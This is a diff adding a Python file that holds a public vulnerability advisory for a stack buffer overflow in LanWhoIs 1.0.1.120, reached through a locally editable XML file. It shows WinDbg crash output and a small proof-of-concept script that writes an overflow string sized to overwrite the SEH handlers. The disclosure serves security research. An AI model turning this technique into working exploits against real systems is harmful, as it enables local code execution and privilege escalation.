@@ -1,0 +1,124 @@
+'''
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-LANWHOIS-BUFFER-OVERFLOW-10062015.txt
+
+
+Vendor:
+================================
+www.lantricks.com
+
+
+Product:
+================================
+LanWhoIs.exe 1.0.1.120
+
+LanWhoIs querys and returns domain (site) holder or IP address informations.
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+======================
+
+LanWhoIs contains a file parsing stack buffer overflow vulnerability. The program has a whois_result.xml
+XML file located under the LanWhoIs directory. This file holds results returned from program queries. If
+LanWhoIs is installed under c:\ instead of 'Program Files' etc.. on shared PC and a non adminstrator user
+has access they can still edit the whois_result.xml, abusing the vuln program and possibly escalate privileges
+or run arbitrary code etc.
+
+e.g.
+
+<WhoisResult>
+  <Result>
+<QueryString>216.239.37.99</QueryString>
+    <ServerName>whois.arin.net</ServerName>
+    <QueryDate>02.01.2005 16:17:30</QueryDate>
+    <QueryType>-1</QueryType>
+ 
+We can exploit the program by injecting malicious payload into the <QueryString> node of the local XML file
+causing buffer overflow overwriting both pointers to the NSEH & SEH exception handlers & control EIP at about 676 bytes.
+
+e.g.
+
+<QueryString>AAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....shellcode...etc..</QueryString>
+
+
+WinDbg stack dump....
+
+(2048.17cc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** WARNING: Unable to verify checksum for image00400000
+*** ERROR: Module load completed but symbols could not be loaded for image00400000
+eax=02bdfec8 ebx=02bdff14 ecx=02bdfecc edx=41414141 esi=00000000 edi=00000000
+eip=00404bc8 esp=02bdfc04 ebp=02bdfecc iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+
+image00400000+0x4bc8:
+00404bc8 8b4af8          mov     ecx,dword ptr [edx-8] ds:002b:41414139=????????
+0:011> !exchain
+02bdfed4: 52525252
+Invalid exception stack at 42424242
+
+registers...
+
+EAX 00000000
+ECX 52525252
+EDX 7714B4AD ntdll.7714B4AD
+EBX 00000000
+ESP 04D0F668
+EBP 04D0F688
+ESI 00000000
+EDI 00000000
+EIP 52525252
+
+
+POC code:
+==========
+
+Run below script, then copy and insert payload into <QueryString> </QueryString> XML node
+and run the application. Next, select the address in the Results window pane and then click Query button
+to run a whois lookup or use the 'F3' keyboard cmd to execute and KABOOOOOOOOOOOOOOOM!!!
+'''
+
+file=open("C:\\hyp3rlinx\\LanTricks\LanWhoIs\\HELL","w")
+payload="A"*676+"BBBB"+"RRRR"         <--------------------#KABOOOOOOOOOOOOOOOOOOM!!!
+file.write(payload)
+file.close()
+
+'''
+Public Disclosure:
+===================
+October 6, 2015  
+
+
+Exploitation Technique:
+=======================
+Local
+Tested on Windows 7 SP1
+
+
+Vulnerable Parameter:
+======================
+QueryString
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
+The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
+
+by hyp3rlinx
+'''
